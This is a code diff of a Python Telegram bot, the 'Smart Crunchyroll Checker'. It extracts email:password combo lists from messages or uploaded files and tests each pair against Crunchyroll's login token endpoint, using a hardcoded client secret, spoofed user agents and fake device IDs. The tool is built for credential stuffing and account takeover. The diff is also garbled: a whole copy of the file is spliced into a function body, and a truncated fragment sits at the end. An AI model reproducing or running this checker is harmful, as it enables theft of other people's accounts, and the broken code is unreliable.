@@ -231,6 +231,41 @@ def crunchyroll_check(username: str, password: str):
         response = requests.post(url, headers=headers, data=data, timeout=25)
         
         if response.status_code != 200:
+import os
+import asyncio
+import re
+import requests
+from uuid import uuid4
+from user_agent import generate_user_agent
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
+
+
+def crunchyroll_check(username: str, password: str):
+    url = "https://beta-api.crunchyroll.com/auth/v1/token"
+    
+    headers = {
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": generate_user_agent()
+    }
+    
+    data = {
+        "grant_type": "password",
+        "username": username,
+        "password": password,
+        "scope": "offline_access",
+        "client_id": "y2arvjb0h0rgvtizlovy",
+        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
+        "device_type": "Redmi",
+        "device_id": str(uuid4()),
+        "device_name": "Redmi note 8 pro"
+    }
+    
+    try:
+        response = requests.post(url, headers=headers, data=data, timeout=25)
+        
+        if response.status_code != 200:
             return "❌ Invalid credentials"
 
         token_data = response.json()
@@ -246,7 +281,7 @@ def crunchyroll_check(username: str, password: str):
 
 
 def extract_combos(text: str):
-    # Improved regex - more flexible
+    # Strong regex for messy formats
     pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
     matches = re.findall(pattern, text)
     combos = [f"{email.strip()}:{pwd.strip()}" for email, pwd in matches if email and pwd]
@@ -255,9 +290,9 @@ def extract_combos(text: str):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🎉 **Smart Crunchyroll Checker v2**\n\n"
-        "Now supports very messy formats!\n"
-        "Just paste and it will extract all combos automatically.",
+        "🎉 **Smart Crunchyroll Checker**\n\n"
+        "Send any messy text with combos.\n"
+        "I will extract and check them automatically.",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -270,10 +305,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     combos = extract_combos(text)
 
     if not combos:
-        await update.message.reply_text("❌ Could not find any `email:password` in your message.")
+        await update.message.reply_text("❌ No email:password found.")
         return
 
-    await update.message.reply_text(f"✅ Extracted **{len(combos)}** combos. Starting check...")
+    await update.message.reply_text(f"✅ Extracted {len(combos)} combos. Checking...")
 
     for i, combo in enumerate(combos, 1):
         email, password = combo.split(":", 1)
@@ -282,7 +317,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = crunchyroll_check(email, password)
         await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
         
-        await asyncio.sleep(2.0)  # Safe delay
+        await asyncio.sleep(2)
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -300,10 +335,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         combos = extract_combos(content)
 
         if not combos:
-            await update.message.reply_text("❌ No combos found in file.")
+            await update.message.reply_text("❌ No combos found.")
             return
 
-        await update.message.reply_text(f"✅ Found {len(combos)} combos. Checking...")
+        await update.message.reply_text(f"✅ Found {len(combos)} combos. Starting...")
 
         for i, combo in enumerate(combos, 1):
             email, password = combo.split(":", 1)
@@ -312,10 +347,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result = crunchyroll_check(email, password)
             await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
             
-            await asyncio.sleep(2.0)
+            await asyncio.sleep(2)
 
     except Exception as e:
-        await update.message.reply_text(f"❌ File error: {str(e)[:100]}")
+        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
 
 
 def main():
@@ -327,6 +362,14 @@ def main():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+
+    print("🚀 Bot Started Successfully!")
+    app.run_polling()
+
+
+if __name__ == "__main__":
+    main()ndler(filters.TEXT, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
     print("🚀 Smart Crunchyroll Checker v2 Running...")
